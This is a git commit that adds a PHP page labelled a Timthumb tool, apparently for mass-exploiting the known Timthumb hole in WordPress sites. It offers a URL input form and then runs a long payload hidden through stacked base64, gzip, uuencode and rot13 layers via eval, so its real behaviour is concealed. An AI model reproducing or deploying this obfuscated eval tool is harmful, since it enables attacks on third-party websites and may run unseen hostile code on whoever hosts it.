1766ca6081dd2e7abef786fa4e44f85fd5650330
Rmdn19id <40439759+Rmdn19id@users.noreply.github.com>
2019-02-24 19:23:54 +0700

    Create a.php

---
+++ a.php
@@ -0,0 +1,26 @@
+<title>By Mr.Rm19</title>
+<style>
+ textarea {
+ 	width: 600px; 
+ 	height: 250px; 
+ 	margin: 5px auto; 
+ 	resize: none;
+ }
+</style>
+<center>
+<form action="" method="POST">
+<textarea name="url"></textarea><br>
+<input style="width: 100px;" type="submit" name="dor" value="GAS">
+</form>
+</center>
+
+<?php
+$a = 'DdDbokJAAIXhe2/BZhhiyjFnhZHDIEQkvP9T7O7Xxfo/EtuyY+dVywr2fm7f3EfU8HDIkdCdtfbhXR50LYCjgviZndRs/t7sEY7rnMHI9ylCpKZB+FXM3uKKhM7Othh11bIqhdrGT9K551pvVNK6eHCYhZlySyhcUSjqq9JQBGgnTKa3L7h3sZQ4UWONSnWsqrtk06jm82/vX45peop5iR14y8ak63GHVaiHFMGhkaZTcO+/KKritTqZ6m6O3Z1GudRlwB5X4N+mY9tc1udjTiuXuZuQuWm0jCnCn+pFnpJ47Y6VBfu1DcY6vNRGczE5HWLgwQSE/d9NNuxAam9lONqjlZQCyqqSIiVwpP3bAu7FuuXpJv0tQ8ObfbjEEtaYJ+/HsmVdlayoM94f6oiz31LRddYUxRFF5LOlnVlm/dJuE5PE0NT4xTpGs9xZl9++s66iD18rfljRuXO3j2wGBVF2CWzqiSKGgxCU2FStLBjq2NMDB/aRk+FENiAAaze8IwSNiOzaKpySPv08Qpd+iOnK/tTstzGhPslzi1lrCQUc+6dv53LEjh1Orhxph/RBbIs0zv8wCRt74fMqD2LHjPczRQQx33pf4h7vYi5Ix9Hgrur3tLeL4/g+GSGAjt7mr/q7ZuqE8d/N6E3Ja5cQkJ95FEg7wPLHLeZH+Wnm5wmyff0O0cZiZUXirpN91s0X/sKXi6Ga5wPwVTZWhbagyKt8gvbaWpuSwIkFp1d2H3uhSqbCvP5d3OtPeYFKJDqFntqlDy6ZhZhICwR+/HXvjqpXK/PtRwbxrP30+wAPdjmn2Udat5qfk0v6y8oewHWrUezVFtd2yeTCX4B+zy2oQWTpbYQLeZLnmfkMa76bN+0qEzZJTURnvulxY8qSVlKi2Js6z/Kvt+HRUsaY5V587jnFbLrDfqTrRO/9mqdhMwDqoP4B';
+// cape gan buat alat nya!
+// alat by Mr.Rm19
+eval(base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($a))))))));
+
+?>
+<html>
+<font color="red"> TOOLS Timthumb by Mr.Rm19 <br> ramdan19id@gmail.com <br>
+</html>
